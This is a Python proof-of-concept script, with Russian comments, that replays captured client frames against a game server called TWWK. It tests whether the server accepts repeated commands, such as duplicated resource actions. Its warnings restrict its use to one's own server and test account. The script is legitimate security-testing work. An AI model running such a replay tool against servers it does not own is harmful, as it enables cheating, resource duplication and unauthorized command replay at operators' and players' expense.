#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────────────
#  TWWK red-team PoC · повтор сессии (replay attack)
#  Берёт записанную proxy.py сессию (session_N.jsonl) и проигрывает
#  клиентские (c2s) кадры на сервер заново. Это прямой тест находки №2:
#
#    • Сервер отклонил повтор / разорвал связь  → ХОРОШО (есть защита).
#    • Сервер ПРИНЯЛ повтор и применил действие  → УЯЗВИМО
#      (нет nonce/счётчика/MAC → дюп ресурсов, повтор команд).
#
#  ⚠ Только против СВОЕГО сервера и тест-аккаунта.
# ─────────────────────────────────────────────────────────────────────
import socket, json, time, sys, argparse, os


def load(path):
    frames = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line:
                frames.append(json.loads(line))
    return frames


def main():
    ap = argparse.ArgumentParser(description="TWWK replay PoC (authorized testing only)")
    ap.add_argument("capture", help="файл записи, напр. captures/session_1.jsonl")
    ap.add_argument("--host", required=True, help="ТВОЙ игровой сервер")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--gap", type=float, default=0.15, help="пауза между кадрами, сек")
    ap.add_argument("--only-frame", type=int, default=None,
                    help="проиграть всю сессию до этого c2s-кадра, затем повторить его N раз")
    ap.add_argument("--repeat", type=int, default=1, help="сколько раз повторить целевой кадр")
    ap.add_argument("--read-replies", action="store_true", help="печатать ответы сервера")
    args = ap.parse_args()

    frames = load(args.capture)
    c2s = [f for f in frames if f["dir"] == "c2s"]
    print(f"  загружено {len(frames)} кадров ({len(c2s)} клиентских c2s)")
    print(f"  цель: {args.host}:{args.port}  ⚠ убедись, что это ТВОЙ сервер\n")

    sock = socket.create_connection((args.host, args.port), timeout=10)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(2.0)

    def send(frame, tag=""):
        data = bytes.fromhex(frame["hex"])
        sock.sendall(data)
        print(f"  → c2s {tag} len={len(data)} op?=0x{data[0]:02x}")
        if args.read_replies:
            try:
                while True:
                    r = sock.recv(65536)
                    if not r: break
                    print(f"    ← s2c len={len(r)} {r[:32].hex()}")
            except socket.timeout:
                pass

    sent = 0
    for f in c2s:
        idx = sent
        send(f, tag=f"#{idx}")
        sent += 1
        if args.only_frame is not None and idx == args.only_frame:
            print(f"\n  ↻ повторяю кадр #{idx} ещё {args.repeat} раз (replay)\n")
            for k in range(args.repeat):
                send(f, tag=f"#{idx} replay {k+1}/{args.repeat}")
                time.sleep(args.gap)
            break
        time.sleep(args.gap)

    print("\n  готово. Сверь в игре: применилось ли действие повторно?")
    print("  применилось → сервер доверяет клиенту (нет анти-replay) → УЯЗВИМО.")
    sock.close()


if __name__ == "__main__":
    main()
